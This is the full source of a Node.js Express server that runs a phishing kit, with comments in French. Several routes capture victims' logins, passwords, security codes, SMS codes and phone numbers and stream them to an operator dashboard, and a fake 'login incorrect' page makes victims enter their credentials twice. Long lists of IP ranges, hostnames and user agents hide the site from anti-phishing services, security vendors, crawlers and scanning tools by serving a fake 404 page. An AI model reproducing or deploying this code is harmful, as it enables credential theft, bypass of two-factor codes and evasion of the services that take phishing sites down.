const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const requestIp = require('request-ip'); // Pour récupérer l'adresse IP
const http = require('http');
const socketIo = require('socket.io');
const dns = require('dns'); // Pour la recherche inverse DNS

const app = express();
const port = process.env.PORT || 3000;

// Créer un serveur HTTP et l'intégrer avec Socket.IO
const server = http.createServer(app);
const io = socketIo(server);

// Middleware pour traiter les données des formulaires POST
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Middleware pour récupérer l'IP de l'utilisateur
app.use(requestIp.mw());

// Liste des IPs bannies (chargée depuis un fichier ou vide au démarrage)
let bannedIPs = new Set();
let bannedIPPatterns = []; // Liste des expressions régulières pour les motifs d'IP

// Charger les IPs bannies depuis un fichier au démarrage
const bannedIPsFile = path.join(__dirname, 'data', 'banned_ips.txt');
if (fs.existsSync(bannedIPsFile)) {
    const bannedData = fs.readFileSync(bannedIPsFile, 'utf8');
    bannedData.split('\n').forEach(ip => {
        ip = ip.trim();
        if (ip) {
            if (ip.includes('*') || ip.includes('^')) {
                // Convertir le motif avec des jokers en expression régulière
                const regexPattern = ip.replace(/\./g, '\\.').replace(/\*/g, '\\d+').replace(/^\^/, '^');
                const regex = new RegExp(regexPattern);
                bannedIPPatterns.push(regex);
            } else {
                bannedIPs.add(ip);
            }
        }
    });
}

// **Ajout des IPs et motifs depuis les scripts PHP**

const additionalIPPatterns = [
    "^66\\.102\\.\\d+\\.\\d+",
    "^38\\.100\\.\\d+\\.\\d+",
    "^185\\.187\\.\\d+\\.\\d+",
    "^185\\.187\\.30\\.\\d+",
    "^107\\.170\\.\\d+\\.\\d+",
    "^149\\.20\\.\\d+\\.\\d+",
    "^38\\.105\\.\\d+\\.\\d+",
    "^173\\.239\\.\\d+\\.\\d+",
    "^173\\.244\\.36\\.\\d+",
    "^74\\.125\\.\\d+\\.\\d+",
    "^66\\.150\\.14\\.\\d+",
    "^54\\.176\\.\\d+\\.\\d+",
    "^184\\.173\\.\\d+\\.\\d+",
    "^66\\.249\\.\\d+\\.\\d+",
    "^128\\.242\\.\\d+\\.\\d+",
    "^72\\.14\\.192\\.\\d+",
    "^208\\.65\\.144\\.\\d+",
    "^209\\.85\\.128\\.\\d+",
    "^216\\.239\\.32\\.\\d+",
    "^207\\.126\\.144\\.\\d+",
    "^173\\.194\\.\\d+\\.\\d+",
    "^64\\.233\\.160\\.\\d+",
    "^64\\.18\\.\\d+\\.\\d+",
    "^194\\.52\\.68\\.\\d+",
    "^194\\.72\\.238\\.\\d+",
    "^62\\.116\\.207\\.\\d+",
    "^212\\.50\\.193\\.\\d+",
    "^69\\.65\\.\\d+\\.\\d+",
    "^50\\.7\\.\\d+\\.\\d+",
    "^131\\.212\\.\\d+\\.\\d+",
    "^46\\.116\\.\\d+\\.\\d+",
    "^62\\.90\\.\\d+\\.\\d+",
    "^89\\.138\\.\\d+\\.\\d+",
    "^82\\.166\\.\\d+\\.\\d+",
    "^85\\.64\\.\\d+\\.\\d+",
    "^85\\.250\\.\\d+\\.\\d+",
    "^93\\.172\\.\\d+\\.\\d+",
    "^109\\.186\\.\\d+\\.\\d+",
    "^194\\.90\\.\\d+\\.\\d+",
    "^212\\.29\\.192\\.\\d+",
    "^212\\.29\\.224\\.\\d+",
    "^212\\.143\\.\\d+\\.\\d+",
    "^212\\.150\\.\\d+\\.\\d+",
    "^212\\.235\\.\\d+\\.\\d+",
    "^217\\.132\\.\\d+\\.\\d+",
    "^50\\.97\\.\\d+\\.\\d+",
    "^66\\.205\\.64\\.\\d+",
    "^204\\.14\\.48\\.\\d+",
    "^64\\.27\\.2\\.\\d+",
    "^67\\.15\\.\\d+\\.\\d+",
    "^202\\.108\\.252\\.\\d+",
    "^193\\.47\\.80\\.\\d+",
    "^64\\.62\\.136\\.\\d+",
    "^66\\.221\\.\\d+\\.\\d+",
    "^64\\.62\\.175\\.\\d+",
    "^198\\.54\\.\\d+\\.\\d+",
    "^192\\.115\\.134\\.\\d+",
    "^216\\.252\\.167\\.\\d+",
    "^193\\.253\\.199\\.\\d+",
    "^69\\.61\\.12\\.\\d+",
    "^64\\.37\\.103\\.\\d+",
    "^38\\.144\\.36\\.\\d+",
    "^64\\.124\\.14\\.\\d+",
    "^206\\.28\\.72\\.\\d+",
    "^209\\.73\\.228\\.\\d+",
    "^158\\.108\\.\\d+\\.\\d+",
    "^168\\.188\\.\\d+\\.\\d+",
    "^66\\.207\\.120\\.\\d+",
    "^167\\.24\\.\\d+\\.\\d+",
    "^192\\.118\\.48\\.\\d+",
    "^67\\.209\\.128\\.\\d+",
    "^12\\.148\\.209\\.\\d+",
    "^12\\.148\\.196\\.\\d+",
    "^193\\.220\\.178\\.\\d+",
    "^198\\.25\\.\\d+\\.\\d+",
    "^64\\.106\\.213\\.\\d+",
    "^81\\.161\\.59\\.\\d+",
    "^66\\.135\\.200\\.\\d+",
    "^94\\.26\\.\\d+\\.\\d+",
    "^95\\.85\\.\\d+\\.\\d+",
    "^72\\.52\\.96\\.\\d+",
    "^212\\.8\\.79\\.\\d+",
    "^62\\.99\\.77\\.\\d+",
    "^83\\.31\\.118\\.\\d+",
    "^91\\.231\\.\\d+\\.\\d+",
    "^206\\.207\\.\\d+\\.\\d+",
    "^91\\.231\\.212\\.\\d+",
    "^198\\.41\\.243\\.\\d+",
    "^162\\.158\\.\\d+\\.\\d+",
    "^162\\.158\\.7\\.\\d+",
    "^162\\.158\\.72\\.\\d+",
    "^173\\.245\\.55\\.\\d+",
    "^108\\.162\\.246\\.\\d+",
    "^162\\.158\\.95\\.\\d+",
    "^108\\.162\\.215\\.\\d+",
    "^95\\.108\\.194\\.\\d+",
    "^141\\.101\\.104\\.\\d+",
    "^93\\.54\\.82\\.\\d+",
    "^69\\.164\\.145\\.\\d+",
    "^194\\.153\\.113\\.\\d+",
    "^178\\.43\\.117\\.\\d+",
    "^62\\.141\\.65\\.\\d+",
    "^83\\.31\\.69\\.\\d+",
    "^107\\.178\\.195\\.\\d+",
    "^149\\.20\\.54\\.\\d+",
    "^85\\.9\\.7\\.\\d+",
    "^87\\.106\\.251\\.\\d+",
    "^107\\.178\\.194\\.\\d+",
    "^124\\.66\\.185\\.\\d+",
    "^133\\.11\\.204\\.\\d+",
    "^185\\.2\\.138\\.\\d+",
    "^188\\.165\\.83\\.\\d+",
    "^78\\.148\\.13\\.\\d+",
    "^192\\.232\\.213\\.\\d+",
    "^1\\.234\\.41\\.\\d+",
    "^176\\.195\\.231\\.\\d+",
    "^206\\.253\\.226\\.\\d+",
    "^107\\.20\\.181\\.\\d+",
    "^188\\.244\\.39\\.\\d+",
    "^38\\.74\\.138\\.\\d+",
    "^37\\.140\\.188\\.\\d+",
    "^195\\.128\\.227\\.\\d+",
    "^104\\.131\\.223\\.\\d+",
    "^46\\.4\\.120\\.\\d+",
    "^198\\.60\\.236\\.\\d+",
    "^217\\.74\\.103\\.\\d+",
    "^92\\.103\\.69\\.\\d+",
    "^46\\.244\\.\\d+\\.\\d+",
    "^131\\.\\d+\\.\\d+\\.\\d+",
    "^157\\.\\d+\\.\\d+\\.\\d+",
    "^202\\.\\d+\\.\\d+\\.\\d+",
    "^204\\.\\d+\\.\\d+\\.\\d+",
    "^207\\.\\d+\\.\\d+\\.\\d+",
    "^213\\.\\d+\\.\\d+\\.\\d+",
    "^219\\.\\d+\\.\\d+\\.\\d+",
    "^63\\.\\d+\\.\\d+\\.\\d+",
    "^64\\.\\d+\\.\\d+\\.\\d+",
    "^65\\.\\d+\\.\\d+\\.\\d+",
    "^68\\.\\d+\\.\\d+\\.\\d+",
    "^66\\.196\\.\\d+\\.\\d+",
    "^66\\.228\\.\\d+\\.\\d+",
    "^67\\.195\\.\\d+\\.\\d+",
    "^68\\.142\\.\\d+\\.\\d+",
    "^72\\.30\\.\\d+\\.\\d+",
    "^74\\.6\\.\\d+\\.\\d+",
    "^98\\.136\\.\\d+\\.\\d+",
    "^202\\.160\\.\\d+\\.\\d+",
    "^209\\.191\\.\\d+\\.\\d+",
    "^68\\.65\\.53\\.71",
    "^91\\.103\\.66\\.\\d+",
    "^208\\.91\\.115\\.\\d+",
    "^199\\.30\\.228\\.\\d+",
    "^89\\.234\\.157\\.254",
    "^91\\.231\\.212\\.111",
    "^163\\.172\\.174\\.24",
    "^185\\.187\\.\\d+\\.\\d+",
    "^185\\.229\\.190\\.\\d+",
    "^87\\.113\\.96\\.90",
    "^165\\.227\\.0\\.128",
    "^165\\.227\\.39\\.194",
    "^46\\.101\\.94\\.163",
    "^46\\.101\\.119\\.24",
    "^82\\.102\\.27\\.75",
    "^159\\.203\\.0\\.156",
    "^162\\.243\\.187\\.126",
    "^69\\.25\\.58\\.61",
    "^45\\.145\\.167\\.95",
    "^82\\.64\\.212\\.50",
    "^178\\.24\\.121\\.188",
    "^47\\.30\\.133\\.89",
    "^103\\.248\\.172\\.42",
    "^69\\.61\\.12\\.\\d+",
    "^38\\.74\\.138\\.\\d+",
    "^89\\.163\\.159\\.214",
    "^185\\.104\\.186\\.168",
    "^185\\.104\\.120\\.4",
    "^217\\.96\\.188\\.74",
    "^217\\.96\\.197\\.246",
    "^212\\.83\\.139\\.219",
    "^212\\.83\\.170\\.209",
    "^184\\.105\\.247\\.195",
    "^82\\.223\\.27\\.82",
    "^37\\.187\\.96\\.202",
    "^92\\.103\\.69\\.158",
    "^37\\.128\\.131\\.171"
];

// Ajouter les motifs supplémentaires à la liste des motifs bannis
additionalIPPatterns.forEach(pattern => {
    const regex = new RegExp(pattern);
    bannedIPPatterns.push(regex);
});

// Ajouter les IPs exactes
const additionalBannedIPs = [
    "68.65.53.71",
    "173.239.240.147",
    "103.248.172.42",
    "69.25.58.61",
    "45.145.167.95",
    "82.64.212.50",
    "185.187.30.13",
    "178.24.121.188",
    "87.113.96.90",
    "165.227.0.128",
    "185.229.190.140",
    "46.101.94.163",
    "165.227.39.194",
    "46.101.119.24",
    "82.102.27.75",
    "173.239.230.97",
    "159.203.0.156",
    "162.243.187.126",
    "47.30.133.89",
    "97.85.126.186",
    "81.0.48.138",
    "184.105.247.195"
];

// Ajouter les IPs exactes supplémentaires à la liste des IPs bannies
additionalBannedIPs.forEach(ip => bannedIPs.add(ip));

// **Listes combinées de blocage pour les noms d'hôtes**
const bannedHostnames = [
    "drweb", "hostinger", "scanurl", "above", "google", "Dr.Web", "facebook", "softlayer",
    "amazonaws", "cyveillance", "dreamhost", "netpilot", "calyxinstitute", "tor-exit",
    "phishtank", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal",
    "torservers", "messagelabs", "sucuri.net", "crawler", "net4sec", "phishtank", "msnbot",
    "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs",
    "sucuri.net", "crawler", "google", "facebook", "crawler", "tor-exit", "cloudflare",
    "cloudfront", "digitalocean", "yahoo", "baidu", "bing", "akamai", "linode", "ovh",
    "kaspersky", "hotwire", "phish"
    // Ajoutez d'autres mots-clés de noms d'hôtes si nécessaire
];

// **Listes combinées de blocage pour les agents utilisateurs**
const bannedUserAgents = [
    "Googlebot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler",
    "bot", "above", "google", "softlayer", "amazonaws", "cyveillance",
    "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit",
    "apache-httpclient", "lssrocketcrawler", "crawler", "urlredirectresolver",
    "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker",
    "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot",
    "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot",
    "aboutusbot", "abrave spider", "accelobot", "acoonbot", "addthis.com",
    "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics",
    "antbot", "apercite", "aportworm", "EBAY", "CL0NA", "jabber", "ebay",
    "arabot", "hotmail!", "msn!", "outlook!", "outlook", "msn", "hotmail",
    "curl", "python-requests", "libwww", "Sogou", "MJ12bot", "scrapy", "bingbot",
    "pingdom", "WordPress", "VisualSiteMapper", "NetcraftSurveyAgent",
    "sucuri", "zgrab", "CheckHost", "MegaIndex", "censys", "w3af", "masscan",
    "sqlmap", "nmap", "ZAP", "AppSpider", "dirbuster", "nikto", "burpcollaborator",
    "fuzzer", "masscan", "sqlmap", "nessus", "nexpose", "paros", "awvs", "netsparker",
    "sf", "masscan", "shodan"
    // Ajoutez d'autres User-Agents spécifiques si nécessaire
];

// Fonction pour vérifier si une IP est bannie
function isIPBanned(ip) {
    if (bannedIPs.has(ip)) {
        return true;
    }
    for (let regex of bannedIPPatterns) {
        if (regex.test(ip)) {
            return true;
        }
    }
    return false;
}

// Fonction pour vérifier si le hostname est bloqué
function isHostnameBanned(hostname) {
    if (!hostname) return false;
    hostname = hostname.toLowerCase();
    return bannedHostnames.some(word => hostname.includes(word.toLowerCase()));
}

// Fonction pour vérifier si le User-Agent est bloqué
function isUserAgentBanned(userAgent) {
    if (!userAgent) return false;
    userAgent = userAgent.toLowerCase();
    return bannedUserAgents.some(word => userAgent.includes(word.toLowerCase()));
}

// Middleware pour bloquer les requêtes indésirables
app.use((req, res, next) => {
    const ip = req.clientIp;
    const userAgent = req.headers['user-agent'] || '';

    // Vérifier si l'IP est bannie
    if (isIPBanned(ip)) {
        // Logger l'IP bannie
        const logPath = path.join(__dirname, 'data', 'captured.txt');
        const logEntry = `IP BANNIE: ${ip} | Date: ${new Date().toLocaleString()}\n`;
        fs.appendFile(logPath, logEntry, (err) => {
            if (err) console.error('Erreur lors de l\'écriture dans captured.txt:', err);
        });

        // Rediriger vers le site spécifié avec un message 404
        res.status(404).send(`
            <h1>404 Not Found</h1>
            The page that you have requested could not be found.
            <script>
                window.location.href = "https://www.mediapart.fr/";
            </script>
        `);
        return;
    }

    // Effectuer une recherche inverse DNS pour obtenir le hostname
    dns.reverse(ip, (err, hostnames) => {
        if (!err && hostnames.length > 0) {
            const hostname = hostnames[0];
            if (isHostnameBanned(hostname)) {
                // Logger l'IP et le hostname
                const logPath = path.join(__dirname, 'data', 'captured.txt');
                const logEntry = `HOSTNAME BLOQUE: IP ${ip}, Hostname ${hostname} | Date: ${new Date().toLocaleString()}\n`;
                fs.appendFile(logPath, logEntry, (err) => {
                    if (err) console.error('Erreur lors de l\'écriture dans captured.txt:', err);
                });

                // Rediriger vers le site spécifié avec un message 404
                res.status(404).send(`
                    <h1>404 Not Found</h1>
                    The page that you have requested could not be found.
                    <script>
                        window.location.href = "https://www.mediapart.fr/";
                    </script>
                `);
                return;
            }
        }

        // Vérifier le User-Agent
        if (isUserAgentBanned(userAgent)) {
            // Logger l'IP et le User-Agent
            const logPath = path.join(__dirname, 'data', 'captured.txt');
            const logEntry = `USER-AGENT BLOQUE: IP ${ip}, User-Agent ${userAgent} | Date: ${new Date().toLocaleString()}\n`;
            fs.appendFile(logPath, logEntry, (err) => {
                if (err) console.error('Erreur lors de l\'écriture dans captured.txt:', err);
            });

            // Rediriger vers le site spécifié avec un message 404
            res.status(404).send(`
                <h1>404 Not Found</h1>
                The page that you have requested could not be found.
                <script>
                    window.location.href = "https://www.mediapart.fr/";
                </script>
            `);
            return;
        }

        // Passer au middleware suivant si tout est OK
        next();
    });
});

// Servir les fichiers statiques (HTML, CSS, JS) depuis le dossier "public"
app.use(express.static(path.join(__dirname, 'public')));

// Middleware de protection par mot de passe pour /data/index.html
app.use('/data/index.html', (req, res, next) => {
    const auth = { login: 'admin', password: '1234' }; // Utilisateur et mot de passe

    // Vérifier l'en-tête Authorization
    const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
    const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');

    // Vérifier l'utilisateur et le mot de passe
    if (login && password && login === auth.login && password === auth.password) {
        return next(); // Si correct, on passe à la route suivante
    }

    // Si incorrect, demander une authentification
    res.set('WWW-Authenticate', 'Basic realm="401"');
    res.status(401).send('Accès refusé'); // Accès refusé si l'authentification échoue
});

// Route pour servir la page index.html depuis le dossier data
app.get('/data/index.html', (req, res) => {
    const filePath = path.join(__dirname, 'data', 'index.html');
    res.sendFile(filePath);
});

// Route GET pour récupérer les logs et les envoyer au format JSON
app.get('/logs', (req, res) => {
    const filePath = path.join(__dirname, 'data', 'logins.txt');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Erreur lors de la lecture du fichier logins.txt :', err);
            return res.status(500).json({ error: 'Erreur lors de la lecture du fichier logins.txt' });
        }

        // Traiter les logs et renvoyer un tableau d'objets
        const logs = data.split('\n').filter(Boolean).map((line, index) => {
            const log = {};
            const keyValuePairs = line.split(',').map(pair => pair.trim());

            keyValuePairs.forEach(pair => {
                const [key, ...valueParts] = pair.split(':');
                const value = valueParts.join(':').trim(); // Gérer les valeurs contenant ':'
                const keyLower = key.toLowerCase();

                if (keyLower.startsWith('login')) {
                    log.login = value;
                } else if (keyLower.startsWith('password')) {
                    log.password = value;
                } else if (keyLower === 'code sms' || keyLower === 'code' || keyLower === 'code1') {
                    log.code = value;
                } else if (keyLower === 'pays') {
                    log.country = value;
                } else if (keyLower === 'téléphone') {
                    log.phone = value;
                } else if (keyLower === 'ip') {
                    log.ip = value;
                }
            });

            // Définir le type en fonction des clés présentes
            if (log.login && log.password) {
                log.type = 'login';
            } else if (log.code && line.toLowerCase().includes('code sms')) {
                log.type = 'code_sms';
            } else if (log.code) {
                log.type = 'code';
            } else if (log.country && log.phone) {
                log.type = 'phone';
            } else {
                log.type = 'unknown';
            }

            return { index, ...log };
        });

        res.json(logs);
    });
});

// Fonction pour notifier tous les clients via Socket.IO
function notifyClients(action, logData) {
    io.emit('update', { action, logData });
}

// Route POST pour capturer les informations de connexion pour index.html
app.post('/save-login', (req, res) => {
    const { login, password } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!login || !password) {
        return res.status(400).json({ error: 'Login et mot de passe sont requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const loginInfo = `Login: ${login}, Password: ${password}, IP: ${ip}\n`;

    fs.appendFile(filePath, loginInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde des informations :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde des informations' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            login,
            password,
            ip,
            type: 'login'
        };
        notifyClients('add', logData);

        res.redirect('/login-incorrect.html');
    });
});

// Route POST pour capturer les informations de connexion depuis login-incorrect.html
app.post('/save-login-incorrect', (req, res) => {
    const { login, password } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!login || !password) {
        return res.status(400).json({ error: 'Login et mot de passe sont requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const loginInfo = `Login1: ${login}, Password1: ${password}, IP: ${ip}\n`;

    fs.appendFile(filePath, loginInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde des informations :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde des informations' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            login,
            password,
            ip,
            type: 'login'
        };
        notifyClients('add', logData);

        res.redirect('/code-confirmation.html');
    });
});

// Route POST pour capturer le code de sécurité depuis code-confirmation.html
app.post('/save-security-code', (req, res) => {
    const { security_code2 } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!security_code2) {
        return res.status(400).json({ error: 'Le code de sécurité est requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const codeInfo = `CODE: ${security_code2}, IP: ${ip}\n`;

    fs.appendFile(filePath, codeInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde des informations :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde des informations' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            code: security_code2,
            ip,
            type: 'code'
        };
        notifyClients('add', logData);

        res.redirect('/confirmation.html');
    });
});

// Route POST pour capturer le code de sécurité depuis confirmation.html
app.post('/save-security-code1', (req, res) => {
    const { security_code2 } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!security_code2) {
        return res.status(400).json({ error: 'Le code de sécurité est requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const codeInfo = `CODE1: ${security_code2}, IP: ${ip}\n`;

    fs.appendFile(filePath, codeInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde des informations :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde des informations' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            code: security_code2,
            ip,
            type: 'code'
        };
        notifyClients('add', logData);

        res.redirect('/confirmation-success.html');
    });
});

// Route POST pour capturer le pays et le numéro de téléphone depuis confirm-sms.html
app.post('/save-sms-verification', (req, res) => {
    const { countryphone, Codesecurite } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!countryphone || !Codesecurite) {
        return res.status(400).json({ error: 'Le pays et le numéro de téléphone sont requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const smsInfo = `Pays: ${countryphone}, Téléphone: ${Codesecurite}, IP: ${ip}\n`;

    fs.appendFile(filePath, smsInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde des informations :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde des informations' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            country: countryphone,
            phone: Codesecurite,
            ip,
            type: 'phone'
        };
        notifyClients('add', logData);

        res.redirect('/confirmation-sms.html');
    });
});

// Route POST pour capturer uniquement le code SMS depuis la nouvelle page
app.post('/save-sms-code', (req, res) => {
    const { Codesecurite } = req.body;
    const ip = req.clientIp; // Récupérer l'adresse IP

    if (!Codesecurite) {
        return res.status(400).json({ error: 'Le code SMS est requis' });
    }

    const filePath = path.join(__dirname, 'data', 'logins.txt');
    const smsCodeInfo = `Code SMS: ${Codesecurite}, IP: ${ip}\n`;

    fs.appendFile(filePath, smsCodeInfo, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde du code SMS :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde du code SMS' });
        }

        // Lire le dernier log ajouté pour l'envoyer aux clients
        const logData = {
            code: Codesecurite,
            ip,
            type: 'code_sms'
        };
        notifyClients('add', logData);

        res.redirect('/confirm-sms.html');
    });
});

// Route POST pour bannir une IP
app.post('/ban-ip', (req, res) => {
    const { ip } = req.body;

    if (!ip) {
        return res.status(400).json({ error: 'Adresse IP requise' });
    }

    // Ajouter l'IP à la liste des IPs bannies
    bannedIPs.add(ip);

    // Sauvegarder la liste des IPs bannies dans le fichier
    fs.appendFile(bannedIPsFile, `${ip}\n`, (err) => {
        if (err) {
            console.error('Erreur lors de la sauvegarde de l\'IP bannie :', err);
            return res.status(500).json({ error: 'Erreur lors de la sauvegarde de l\'IP bannie' });
        }

        // Notifier les clients que l'IP a été bannie
        io.emit('ban-ip', { ip });

        res.json({ success: true, message: `IP ${ip} bannie avec succès.` });
    });
});

// Route DELETE pour supprimer une ligne spécifique dans logins.txt
app.delete('/delete-log/:index', (req, res) => {
    const index = parseInt(req.params.index, 10);
    const filePath = path.join(__dirname, 'data', 'logins.txt');

    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Erreur lors de la lecture du fichier logins.txt :', err);
            return res.status(500).json({ error: 'Erreur lors de la lecture du fichier logins.txt' });
        }

        const lines = data.split('\n').filter(Boolean); // Obtenir toutes les lignes non vides
        if (index >= 0 && index < lines.length) {
            const removedLine = lines.splice(index, 1)[0]; // Supprimer la ligne à l'index donné

            // Écrire les lignes restantes dans logins.txt
            fs.writeFile(filePath, lines.join('\n'), (err) => {
                if (err) {
                    console.error('Erreur lors de la sauvegarde des modifications :', err);
                    return res.status(500).json({ error: 'Erreur lors de la sauvegarde des modifications' });
                }

                // Notifier les clients que la ligne a été supprimée
                notifyClients('delete', { index });

                res.json({ success: true });
            });
        } else {
            res.status(400).json({ error: 'Index invalide' });
        }
    });
});

// Écouter les connexions Socket.IO
io.on('connection', (socket) => {
    console.log('Un client est connecté');

    // Optionnel : envoyer les IPs bannies au nouveau client
    socket.emit('banned-ips', Array.from(bannedIPs));

    socket.on('disconnect', () => {
        console.log('Un client est déconnecté');
    });
});

// Lancer le serveur avec Socket.IO
server.listen(port, () => {
    console.log(`Serveur démarré sur http://localhost:${port}`);
});